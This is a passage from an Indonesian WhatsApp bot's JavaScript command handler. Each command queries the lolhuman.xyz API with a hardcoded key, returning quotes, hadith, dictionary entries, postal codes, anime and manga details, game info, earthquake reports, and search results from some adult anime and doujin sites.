    .then((response) => {
      const result = response.data.result;
      replygcxeon(result);
    })
    .catch((error) => {
      console.error('Error:', error);
      replygcxeon('*Terjadi kesalahan saat mencari kata bijak*');
    });

  break;
}
case 'pantun' : {
  replygcxeon(mess.wait)
  const axios = require('axios');
  const apiKey = 'Shirooo';
  const apiUrl = `https://api.lolhuman.xyz/api/random/pantun?apikey=${apiKey}`;

  axios.get(apiUrl)
    .then((response) => {
      const result = response.data.result;
      replygcxeon(result);
    })
    .catch((error) => {
      console.error('Error:', error);
      replygcxeon('*Terjadi kesalahan saat mencari pantun*');
    });

  break;
}
case 'puisi' : {
  replygcxeon(mess.wait)
  const axios = require('axios');
  const apiKey = 'Shirooo';
  const apiUrl = `https://api.lolhuman.xyz/api/random/puisi?apikey=${apiKey}`;

  axios.get(apiUrl)
    .then((response) => {
      const result = response.data.result;
      replygcxeon(result);
    })
    .catch((error) => {
      console.error('Error:', error);
      replygcxeon('*Terjadi kesalahan saat mencari puisi*');
    });

  break;
}
case 'quotesdilan' : {
  replygcxeon(mess.wait)
  const axios = require('axios');
  const apiKey = 'Shirooo';
  const apiUrl = `https://api.lolhuman.xyz/api/quotes/dilan?apikey=${apiKey}`;

  axios.get(apiUrl)
    .then((response) => {
      const result = response.data.result;
      replygcxeon(result);
    })
    .catch((error) => {
      console.error('Error:', error);
      replygcxeon('*Terjadi kesalahan saat mencari quotes dilan*');
    });

  break;
}
case 'quotesislami' : {
  replygcxeon(mess.wait)
  const axios = require('axios');
  const apiKey = 'Shirooo';
  const apiUrl = `https://api.lolhuman.xyz/api/quotes/islami?apikey=${apiKey}`;

  axios.get(apiUrl)
    .then((response) => {
      const result = response.data.result;
      replygcxeon(result);
    })
    .catch((error) => {
      console.error('Error:', error);
      replygcxeon('*Terjadi kesalahan saat mencari quotes islami*');
    });

  break;
}
case 'hadist': {
  if (!q) return replygcxeon(`Format: *.hadist Kata Kunci*`)
replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Replace with your API key
  
  const query = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/hadits/search?apikey=${apikey}&query=${query}`

  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      let hadistText = ''
      for (const item of result) {
        const kitab = item.kitab
        const hadits = item.hadits.map(h => `- ${h}`).join('\n')

        hadistText += `Kitab: *${kitab}*\n*${hadits}*\n\n`
      }

      replygcxeon(hadistText)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Hadist tidak ditemukan.*`)
    })

  break
}
case 'sfile': {
  if (!q) return replygcxeon(`Format: *.sfile Tautan Sfile*`)
replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Ganti dengan API key Anda

  const apiUrl = `https://api.lolhuman.xyz/api/sfile?apikey=${apikey}&url=${encodeURIComponent(q)}`

  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result

      const title = result.title
      const uploaded = result.uploaded
      const downloaded = result.downloaded
      const size = result.size
      const link = result.link

      const message = `Judul: *${title}*\n` +
                      `Diunggah: *${uploaded}*\n` +
                      `Diunduh: *${downloaded}*\n` +
                      `Ukuran: *${size}*\n` +
                      `Tautan: *${link}*`

      replygcxeon(message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Terjadi kesalahan dalam mendapatkan detail dan alternatif download link.*`)
    })

  break
}
case 'searchbijak': {
  if (!q) return replygcxeon(`Format: *.searchbijak Kata Kunci*`)
  replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo' // Replace with your API key
  
  const query = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/searchbijak?apikey=${apiKey}&query=${query}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result

      if (result.length === 0) {
        replygcxeon(`*Tidak ditemukan kutipan bijak untuk kata kunci tersebut*`)
      } else {
        let quoteText = ''
        for (const item of result) {
          const quoteContent = item.quote
          const author = item.author

          quoteText += `Kutipan: *${quoteContent}*\n` +
                        `Penulis: *${author}*\n\n`
        }

        replygcxeon(quoteText)
      }
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Terjadi kesalahan dalam mencari kutipan bijak.*`)
    })
  
  break
}
case 'randombahasa': {
  if (!q) return replygcxeon(`Format: *.randombahasa Teks*`)
  replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo' // Replace with your API key
  const query = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/randombahasa?apikey=${apiKey}&text=${query}`

  axios.get(apiUrl)
    .then((response) => {
      const result = response.data.result
      const replyMessage = `Hasil: *${result}*`

      replygcxeon(replyMessage)
    })
    .catch((error) => {
      console.error('Error:', error)
      replygcxeon('*Terjadi kesalahan dalam memuat teks random bahasa.*')
    })
  
  break
}
case 'roboguru': {
  if (!q) return replygcxeon(`Format: *.roboguru Pertanyaan*`)
replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo' // Replace with your API key

  const query = encodeURIComponent(q)
  const grade = 'sma' // Replace with the desired grade
  const subject = 'sejarah' // Replace with the desired subject

  const apiUrl = `https://api.lolhuman.xyz/api/roboguru?apikey=${apiKey}&query=${query}&grade=${grade}&subject=${subject}`

  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result

      if (result.length === 0) {
        replygcxeon(`*Tidak ditemukan jawaban untuk pertanyaan tersebut*`)
      } else {
        let answerText = ''
        for (const item of result) {
          const question = item.question
          const answer = item.answer

          answerText += `Pertanyaan: *${question}*\n` +
            `Jawaban: *${answer}*\n\n`
        }

        replygcxeon(answerText)
      }
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Terjadi kesalahan dalam mencari jawaban.*`)
    })

  break
}
case 'niatsholat': {
  if (!q) return replygcxeon(`Format: *.niatsholat JenisSholat*`)
  replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo'
  const prayerType = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/niatsholat/${prayerType}?apikey=${apiKey}`
  
  axios.get(apiUrl)
    .then((response) => {
      const result = response.data.result
      const niatName = result.name
      const niatArabic = result.ar
      const niatLatin = result.latin
      const niatIndonesian = result.id
      
      const niatMessage = `
Jenis Sholat: *${niatName}*
Arab: *${niatArabic}*
Latin: *${niatLatin}*
Indonesia: *${niatIndonesian}*
      `
      
      replygcxeon(niatMessage)
    })
    .catch((error) => {
      console.log(error)
      replygcxeon('Niat sholat tersebut ditemukan, niat sholat yang tersedia *subuh, dzuhur, ashar, maghrib, isya*')
    })
}
break
case 'quotes': {
 replygcxeon(mess.wait)
  const axios = require('axios');
  const apiKey = 'Shirooo';
  const apiUrl = `https://api.lolhuman.xyz/api/random/quotes?apikey=${apiKey}`;
  
  axios.get(apiUrl)
    .then((response) => {
      const result = response.data.result;
      const author = result.by;
      const quote = result.quote;
      
      const replyMessage = `*"${quote}"* - *${author}*`;
      replygcxeon(replyMessage);
    })
    .catch((error) => {
      console.log(error);
      replygcxeon('*Terjadi kesalahan saat mengambil quotes.*');
    });
  
  break;
}
case 'quotesanime': {
  replygcxeon(mess.wait)
  const axios = require('axios');
  const apikey = 'Shirooo'; // Replace with your API key

  const apiUrl = `https://api.lolhuman.xyz/api/random/quotesnime?apikey=${apikey}`;

  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result;

      const quote = result.quote;
      const character = result.character;
      const anime = result.anime;
      const episode = result.episode;

      const message = `Mengutip: *${quote}*\n` +
        `Karakter: *${character}*\n` +
        `Anime: *${anime}*\n` +
        `Episode: *${episode}*`;

      replygcxeon(message);
    })
    .catch(error => {
      console.error('Error:', error);
      replygcxeon('*Terjadi kesalahan dalam mengambil quotes anime*');
    });

  break;
}
case 'kbbi': {
  if (!q) return replygcxeon(`Format: *.kbbi Kata*`)
  replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo'
  const query = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/kbbi?apikey=${apiKey}&query=${query}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result[0]
      
      const nama = result.nama
      const kelas = result.makna.map(m => m.kelas[0].nama).join(', ')
      const submakna = result.makna.map(m => m.submakna.join(', ')).join('\n\n')
      const contoh = result.makna.map(m => m.contoh.join('\n')).join('\n\n')
      
      const wordInfo = `
*Kata:* ${nama}
*Kelas:* ${kelas}
*Submakna:*\n${submakna}
*Contoh:*\n${contoh}
      `
      
      replygcxeon(wordInfo)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon('Terjadi kesalahan saat mencari informasi kata di KBBI.')
    })
  
  break
}
case 'kisahnabi': {
  if (!q) return replygcxeon(`Format: *.kisahnabi Nama*`)
  replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo' // Replace with your API key
  
  const namaNabi = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/kisahnabi/${namaNabi}?apikey=${apiKey}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      const name = result.name
      const birthYear = result.thn_kelahiran
      const age = result.age
      const place = result.place
      const story = result.story

      const message = `*Nama Nabi:* ${name}\n` +
        `*Tahun Kelahiran:* ${birthYear}\n` +
        `*Usia:* ${age}\n` +
        `*Tempat Lahir:* ${place}\n\n` +
        `*Kisah:*\n${story}`

      // Sending the Prophet/Messenger's story as a reply
      replygcxeon(message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Tidak Ditemukan*`)
    })
  
  break
}
case 'kodepos': {
  if (!q) return replygcxeon(`Format: *.kodepos Nama Tempat*`)
  replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo' // Replace with your API key
  
  const query = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/kodepos?apikey=${apiKey}&query=${query}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      if (result.length === 0) {
        replygcxeon(`*Tidak ditemukan kode pos untuk tempat tersebut*`)
      } else {
        let postalCodeText = ''
        for (const item of result) {
          const province = item.province
          const city = item.city
          const subdistrict = item.subdistrict
          const urban = item.urban
          const postalCode = item.postalcode

          postalCodeText += `Provinsi: *${province}*\n` +
                            `Kota: *${city}*\n` +
                            `Kecamatan: *${subdistrict}*\n` +
                            `Kelurahan: *${urban}*\n` +
                            `Kode Pos: *${postalCode}*\n\n`
        }

        replygcxeon(postalCodeText)
      }
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Terjadi kesalahan dalam mencari kode pos*`)
    })

  break
}
case 'katabucin' : {
  replygcxeon(mess.wait)
  const axios = require('axios');
  const apiUrl = 'https://api.lolhuman.xyz/api/random/bucin?apikey=Shirooo';

  axios.get(apiUrl)
    .then((response) => {
      const result = response.data.result;
      replygcxeon(result);
    })
    .catch((error) => {
      console.error('Error:', error);
      replygcxeon('Terjadi kesalahan saat mencari kata bucin.');
    });
  
  break;
}
case 'nekopoisearch': {
  if (!q) return replygcxeon(`Format: *.nekopoi Judul*`)
replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo' // Replace with your API key
  
  const query = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/nekopoisearch?apikey=${apiKey}&query=${query}`

  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result

      if (result.length === 0) {
        replygcxeon(`No videos found for the query "${q}"`)
      } else {
        let videoText = ''
        for (const item of result) {
          const title = item.title
          const link = item.link
          const thumbnail = item.thumbnail

          videoText += `Title: *${title}*\n` +
                       `Link: *${link}*\n` +
                       `Thumbnail: *${thumbnail}*\n\n`
        }

        replygcxeon(videoText)
      }
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Terjadi kesalahan saat menelusuri video.*`)
    })

  break
}
case 'nhentai': {
  if (!q) return replygcxeon(`Format: *.nhentai KodeDoujin*`)
  replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo'
  const apiUrl = `https://api.lolhuman.xyz/api/nhentai/${q}?apikey=${apiKey}`
  
  axios.get(apiUrl)
    .then((response) => {
      const result = response.data.result
      const {
        title_romaji,
        title_native,
        read,
        tags,
        image
      } = result
      
      const tagsList = tags.join(', ')
      
      const nhentaiInfo = `
Judul (Romaji): *${title_romaji}*
Judul (Native): *${title_native}*
Tag: *${tagsList}*
      `
      
      const imageUrls = image.map(url => `- *${url}*`).join('\n')
      
      const replyMessage = `${nhentaiInfo}\n\nGambar:\n${imageUrls}\n\nBaca Online: *${read}*`
      replygcxeon(replyMessage)
    })
    .catch((error) => {
      console.log(error)
      replygcxeon('*Terjadi kesalahan saat mencari informasi doujin di nhentai.*')
    })
}
break
case 'nhentaisearch': {
  if (!q) return replygcxeon(`Format: *.nhentaisearch Judul Doujin*`)
  replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo'
  const apiUrl = `https://api.lolhuman.xyz/api/nhentaisearch?apikey=${apiKey}&query=${encodeURIComponent(q)}`
  
  axios.get(apiUrl)
    .then((response) => {
      const result = response.data.result

      if (result.length === 0) {
        replygcxeon(`*Tidak ditemukan doujin dengan judul tersebut.*`)
      } else {
        let doujinList = ''
        for (const doujin of result) {
          const doujinId = doujin.id
          const doujinTitleEnglish = doujin.title_english
          const doujinTitleJapanese = doujin.title_japanese
          const doujinTitleNative = doujin.title_native
          const doujinPage = doujin.page

          doujinList += `ID: *${doujinId}*\n` +
                        `Judul (Bahasa Inggris): *${doujinTitleEnglish}*\n` +
                        `Judul (Bahasa Jepang): *${doujinTitleJapanese}*\n` +
                        `Judul (Asli): *${doujinTitleNative}*\n` +
                        `Halaman: *${doujinPage}*\n\n`
        }

        replygcxeon(doujinList)
      }
    })
    .catch((error) => {
      console.log(error)
      replygcxeon('*Terjadi kesalahan saat mencari doujin.*')
    })
}
break
case 'otakudesu': {
  if (!q) return replygcxeon(`Format: *.otakudesu Tautan Otakudesu*`)
  replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Ganti dengan API key Anda
  const apiUrl = `https://api.lolhuman.xyz/api/otakudesu?apikey=${apikey}&url=${encodeURIComponent(q)}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      const title = result.title
      const japanese = result.japanese
      const judul = result.judul
      const type = result.type
      const episodes = result.episodes
      const aired = result.aired
      const producers = result.producers
      const genres = result.genres
      const duration = result.duration
      const studios = result.studios
      const rating = result.rating
      const credit = result.credit
      const link_dl = result.link_dl
      
      let links = ''
      link_dl.forEach(link => {
        const title = link.title
        const linkDl = link.link_dl
        
        links += `- ${title}\n`
        
        for (const reso in linkDl) {
          const size = linkDl[reso].size
          const url = linkDl[reso].link_dl
          
          links += `  - Resolusi: ${reso}\n`
          links += `    Ukuran: ${size}\n`
          links += `    Tautan: ${url}\n`
        }
      })
      
      const message = `Judul: *${title}*\n` +
        `Jepang: *${japanese}*\n` +
        `Judul: *${judul}*\n` +
        `Tipe: *${type}*\n` +
        `Episode: *${episodes}*\n` +
        `Ditayangkan: *${aired}*\n` +
        `Produser: *${producers}*\n` +
        `Genre: *${genres}*\n` +
        `Durasi: *${duration}*\n` +
        `Studio: *${studios}*\n` +
        `Peringkat: *${rating}*\n` +
        `Kredit: *${credit}*\n` +
        `Tautan Unduhan:\n${links}`
      
      // Mengirimkan informasi otakudesu sebagai pesan
      replygcxeon(message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`Format: *.otakudesu Tautan Otakudesu*`)
    })
  
  break
}
case 'nekopoi': {
  if (!q) return replygcxeon('Format: *.nekopoi Tautan Nekopoi*')
replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Ganti dengan API key Anda
  
  const url = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/nekopoi?apikey=${apikey}&url=${url}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      const thumbnail = result.thumbnail
      const sinopsis = result.sinopsis
      const genre = result.genre.join(', ')
      const title = result.title
      const producers = result.producers
      const duration = result.duration
      const links = result.link

      let linkText = ''

      Object.keys(links).forEach(quality => {
        linkText += `${quality}:\n`
        
        Object.keys(links[quality]).forEach(source => {
          linkText += `${source}: *${links[quality][source]}*\n`
        })

        linkText += '\n'
      })

      const message = `Judul: *${title}*\n` +
        `Produksi: *${producers}*\n` +
        `Durasi: *${duration}*\n` +
        `Genre: *${genre}*\n` +
        `Sinopsis: *${sinopsis}*\n\n` +
        `Tautan Unduhan:\n${linkText}`

      // Sending the nekopoi information as a reply
      replygcxeon(message)
      XeonBotInc.sendImage(from, thumbnail, title, message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon('Terjadi kesalahan saat mencari informasi nekopoi.')
    })

  break
}
case 'mangasearch': {
  if (!q) return replygcxeon(`Format: *.manga Judul Manga*`)
replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo' // Replace with your API key
  
  const query = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/manga?apikey=${apiKey}&query=${query}`

  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      const mangaId = result.id
      const mangaIdMal = result.idMal
      const mangaTitleRomaji = result.title.romaji
      const mangaTitleEnglish = result.title.english
      const mangaTitleNative = result.title.native
      const mangaCoverImageLarge = result.coverImage.large
      const mangaCoverImageMedium = result.coverImage.medium
      const mangaFormat = result.format
      const mangaChapters = result.chapters
      const mangaVolumes = result.volumes
      const mangaStatus = result.status
      const mangaSource = result.source
      const mangaGenres = result.genres
      const mangaStartDate = result.startDate
      const mangaEndDate = result.endDate
      const mangaDescription = result.description
      const mangaAverageScore = result.averageScore
      const mangaSynonyms = result.synonyms
      const mangaCharacters = result.characters.nodes

      const characterNames = mangaCharacters.map(node => node.name.full).join(', ')
      
      const mangaInfo = `
Judul: *${mangaTitleRomaji} (${mangaTitleNative})*
Judul Inggris: *${mangaTitleEnglish}*
Format: *${mangaFormat}*
Bab: *${mangaChapters}*
Volume: *${mangaVolumes}*
Status: *${mangaStatus}*
Sumber: *${mangaSource}*
Genre: *${mangaGenres.join(', ')}*
Mulai Tanggal: *${mangaStartDate.year}-${mangaStartDate.month}-${mangaStartDate.day}*
Tanggal Berakhir: *${mangaEndDate.year}-${mangaEndDate.month}-${mangaEndDate.day}*
Deskripsi: *${mangaDescription}*
Skor Rata-Rata: *${mangaAverageScore}*
Sinonim: *${mangaSynonyms.join(', ')}*
Karakter: *${characterNames}*
      `
      
      const coverImageUrl = mangaCoverImageLarge
      const replyMessage = `${mangaInfo}\n\nGambar Sampul: *${coverImageUrl}*`
      replygcxeon(replyMessage)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon('*Terjadi kesalahan saat mencari informasi manga.*')
    })
  
  break
}
case 'lirik2': {
  if (!q) return replygcxeon(`Format: *.lirik2 Nama Lagu*`)
  replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo' // Replace with your API key
  
  const query = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/lirik?apikey=${apiKey}&query=${query}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      const lyrics = result
      
      const message = `Lirik Lagu "${q}":\n${lyrics}`
      
      // Send the lyrics as a reply
      replygcxeon(message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon('*Terjadi kesalahan saat mencari lirik lagu.*')
    })
}
break
case 'kumparan' : {
  replygcxeon(mess.wait)
  const axios = require('axios');
  const apikey = 'Shirooo'; // Replace with your API key
  
  const apiUrl = `https://api.lolhuman.xyz/api/kumparan?apikey=${apikey}`;
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result;
      
      let newsList = '';
      result.forEach(news => {
        const title = news.title;
        const link = news.link;
        const desc = news.desc;
        const category = news.category;
        const publish = news.publish;
        
        const newsInfo = `
Judul: *${title}*
Tautan: *${link}*
Deskripsi: *${desc}*
Kategori: *${category}*
Tanggal Terbit: *${publish}*
        `;
        
        newsList += `${newsInfo}\n\n`;
      });
      
      const replyMessage = `*Berita terbaru dari Kumparan:*\n\n${newsList}`;
      replygcxeon(replyMessage);
    })
    .catch(error => {
      console.error('Error:', error);
      replygcxeon('*Terjadi kesalahan saat mengambil berita dari Kumparan.*');
    });
  
  break;
}
case 'genshin': {
  if (!q) return replygcxeon(`Format: *.genshin Nama Karakter*`)
replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Ganti dengan API key Anda
  
  const character = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/genshin/${character}?apikey=${apikey}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      const title = result.title
      const icon = result.icon
      const cover1 = result.cover1
      const cover2 = result.cover2
      const name = result.name
      const attr = result.attr
      const intro = result.intro
      const sen = result.sen
      const cv = result.cv

      const message = `*Karakter:* ${title}\n` +
        `*Gambar:* ${icon}\n` +
        `*Sampul 1:* ${cover1}\n` +
        `*Sampul 2:* ${cover2}\n` +
        `*Nama:* ${name}\n` +
        `*Atribut:* ${attr}\n` +
        `*Pendahuluan:* ${intro}\n` +
        `*Sen:* ${sen}\n\n` +
        `CV:\n`

      let cvList = ''
      cv.forEach(cvItem => {
        const cvName = cvItem.name
        const cvAudio = cvItem.audio.join('\n')

        cvList += `- Nama: ${cvName}\n` +
                  `  Audio:\n${cvAudio}\n\n`
      })

      const characterInfo = {
        title: title,
        message: message + cvList,
        thumbnail: icon,
        url: cover1
      }

      // Mengirimkan informasi karakter Genshin Impact sebagai pesan atau media
      XeonBotInc.sendTextWithMentions(from, characterInfo.message)
      XeonBotInc.sendImage(from, characterInfo.thumbnail, characterInfo.title, characterInfo.message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`Karakter Tersebut Tidak Tersedia. Karakter Yang Tersedia *jean, amber, lisa, kaeya, barbara, diluc, razor, venti, klee, bennett, noelle, fischl, sucrose, mona, diona, albedo, rosaria, eula, aloy, xiao, beidou, ningguang, xiangling, xingqiu, chongyun, qiqi, keqing, tartaglia, zhongli, xinyan, ganyu, hu tao, yanfei, shenhe, yun jin, yelan, kamisato ayaka, kaedehara kazuha, yoimiya, sayu, raiden shogun, kujou sara, sangonomiya kokomi, thoma, arataki itto, gorou, yae miko, kamisato ayato, kuki shinobu, shikanoin heizou, tighnari, collei, dori, cyno, candace, nilou, nahida, layla, wanderer, faruzan*`)
    })
  
  break
}
case 'growiki': {
  if (!q) return replygcxeon(`Format: *.growiki Nama Item*`)
replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Ganti dengan API key Anda
  
  const itemQuery = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/growiki?apikey=${apikey}&query=${itemQuery}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result

      const itemName = result.name
      const itemDescription = result.desc
      const itemProperties = result.prop
      const itemImage = result.img
      const itemRecipe = result.recipe
      const itemInfo = result.info

      let message = `Nama Item: *${itemName}*\n` +
        `Deskripsi: *${itemDescription}*\n` +
        `Properti: *${itemProperties}*\n\n` +
        `Resep: \n`

      if (itemRecipe.length === 0) {
        message += `*Tidak ada informasi resep untuk item ini.*\n`
      } else {
        itemRecipe.forEach(recipe => {
          message += `*${recipe}*\n`
        })
      }

      message += `\nInformasi Tambahan: *${itemInfo}*`

      // Mengirimkan informasi item Growtopia sebagai pesan
      replygcxeon(message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Item Tidak Ditemukan*`)
    })
  
  break
}
case 'growtopia' : {
  replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Ganti dengan API key Anda
  const apiUrl = `https://api.lolhuman.xyz/api/growtopia?apikey=${apikey}`

  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      const playerOnline = result.player_online
      const wotdName = result.wotd.name
      const wotdPreview = result.wotd.preview

      const message = `*Informasi Growtopia*\n` +
        `Jumlah Pemain Online: *${playerOnline}*\n` +
        `WOTD (World of The Day): *${wotdName}*\n` +
        `Pratinjau WOTD: *${wotdPreview}*`

      // Mengirimkan informasi Growtopia sebagai pesan
      replygcxeon(message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Terjadi kesalahan dalam mengambil informasi Growtopia*`)
    })
  
  break
}
case 'gsmarena':
  if (!q) return replygcxeon(`Format: *.gsmarena Nama Handphone*`);
replygcxeon(mess.wait)
  const apikey = 'Shirooo'; // Ganti dengan API key Anda
  const apiUrl = `https://api.lolhuman.xyz/api/gsmarenadetail?apikey=${apikey}&url=https://www.gsmarena.com/${encodeURIComponent(q)}.php`;

  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result;

      const phoneName = result.phone_name;
      const phoneImage = result.phone_image;
      const specification = result.specification;

      const message = `Informasi Handphone\n` +
        `Nama: ${phoneName}\n` +
        `Gambar: ${phoneImage}\n` +
        `Spesifikasi:\n` +
        `- Jaringan: ${specification.network}\n` +
        `- Peluncuran: ${specification.launch}\n` +
        `- Body: ${specification.body}\n` +
        `- Layar: ${specification.display}\n` +
        `- Platform: ${specification.platform}\n` +
        `- Memori: ${specification.memory}\n` +
        `- Kamera Utama: ${specification.main_camera}\n` +
        `- Kamera Selfie: ${specification.selfie_camera}\n` +
        `- Suara: ${specification.sound}\n` +
        `- Komunikasi: ${specification.comms}\n` +
        `- Fitur: ${specification.features}\n` +
        `- Baterai: ${specification.battery}\n` +
        `- Lainnya: ${specification.misc}\n` +
        `- Pengujian: ${specification.tests}`;

      // Mengirimkan informasi handphone sebagai pesan
      replygcxeon(message);
    })
    .catch(error => {
      console.error('Error:', error);
      replygcxeon(`Terjadi kesalahan dalam mengambil informasi handphone`);
    });

  break;
case 'gempa' : {
  replygcxeon(mess.wait)
  const axios = require('axios');
  const apiKey = 'Shirooo';
  const apiUrl = `https://api.lolhuman.xyz/api/infogempa?apikey=${apiKey}`;
  
  axios.get(apiUrl)
    .then((response) => {
      const result = response.data.result;
      const mapUrl = result.map;
      const waktu = result.waktu;
      const magnitude = result.magnitude;
      const kedalaman = result.kedalaman;
      const koordinat = result.koordinat;
      const lokasi = result.lokasi;
      const potensi = result.potensi;
      
      const message = `
*Informasi Gempa Terkini:*
Waktu: *${waktu}*
Besarnya: *${magnitude}*
Kedalaman: *${kedalaman}*
Koordinat: *${koordinat}*
Lokasi: *${lokasi}*
Potensi Tsunami: *${potensi}*
Peta: *${mapUrl}*
      `;
      
      replygcxeon(message);
    })
    .catch((error) => {
      console.error('Error:', error);
      replygcxeon('*Terjadi kesalahan saat mencari informasi gempa*');
    });
}
break;
case 'anime': {
  if (!q) return replygcxeon(`Format: *.anime Judul Anime*`)
  replygcxeon(mess.wait)
  const axios = require('axios')
  const apiKey = 'Shirooo'
  const apiUrl = `https://api.lolhuman.xyz/api/anime?apikey=${apiKey}&query=${encodeURIComponent(q)}`
  
  axios.get(apiUrl)
    .then((response) => {
      const result = response.data.result
      const {
        id,
        title,
        coverImage,
        format,
        episodes,
        duration,
        status,
        season,
        seasonYear,
        source,
        genres,
        startDate,
        endDate,
        description,
        averageScore,
        synonyms,
        characters
      } = result
      
      const characterNames = characters.nodes.map(node => node.name.full).join(', ')
      
      const animeInfo = `
Judul: *${title.romaji} (${title.native})*
Format: *${format}*
Episode: *${episodes}*
Durasi: *${duration} Minute*
Status: *${status}*
Musim: *${season} ${seasonYear}*
Sumber: *${source}*
Genre: *${genres.join(', ')}*
Mulai Tanggal: *${startDate.year}-${startDate.month}-${startDate.day}*
Tanggal Berakhir: *${endDate.year}-${endDate.month}-${endDate.day}*
Deskripsi: *${description}*
Skor Rata-Rata: *${averageScore}*
Synonyms: *${synonyms.join(', ')}*
Characters: *${characterNames}*
      `
      
      const coverImageUrl = coverImage.large
      const replyMessage = `${animeInfo}\n\nGambar Sampul: *${coverImageUrl}*`
      replygcxeon(replyMessage)
    })
    .catch((error) => {
      console.log(error)
      replygcxeon('*Terjadi kesalahan saat mencari informasi anime.*')
    })
}
break 
case 'artimimpi': {
  if (!q) return replygcxeon(`Format: *.artimimpi Mimpimu*`)
replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Ganti dengan API key Anda
  
  const query = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/primbon/artimimpi?apikey=${apikey}&query=${query}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result
      
      const meanings = result.join('\n')

      const message = `Arti Mimpi "${q}":\n${meanings}`

      // Mengirimkan arti mimpi sebagai pesan
      replygcxeon(message)
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Terjadi kesalahan dalam mencari arti mimpi*`)
    })
  
  break
}
case 'brainly': {
  if (!q) return replygcxeon(`Format: *.brainly Pertanyaan*`)
replygcxeon(mess.wait)
  const axios = require('axios')
  const apikey = 'Shirooo' // Ganti dengan API key Anda
  
  const query = encodeURIComponent(q)
  const apiUrl = `https://api.lolhuman.xyz/api/brainly?apikey=${apikey}&query=${query}`
  
  axios.get(apiUrl)
    .then(response => {
      const result = response.data.result

      if (result.length === 0) {
        replygcxeon(`Tidak ditemukan jawaban untuk pertanyaan tersebut`)
      } else {
        let answerText = ''
        for (const item of result) {
          const questionContent = item.question.content
          const answerContent = item.answer.content

          answerText += `Pertanyaan: ${questionContent}\n` +
                        `Jawaban: ${answerContent}\n\n`
        }

        replygcxeon(answerText)
      }
    })
    .catch(error => {
      console.error('Error:', error)
      replygcxeon(`*Terjadi kesalahan dalam mencari jawaban*`)
    })
  
  break
}
case 'character': {
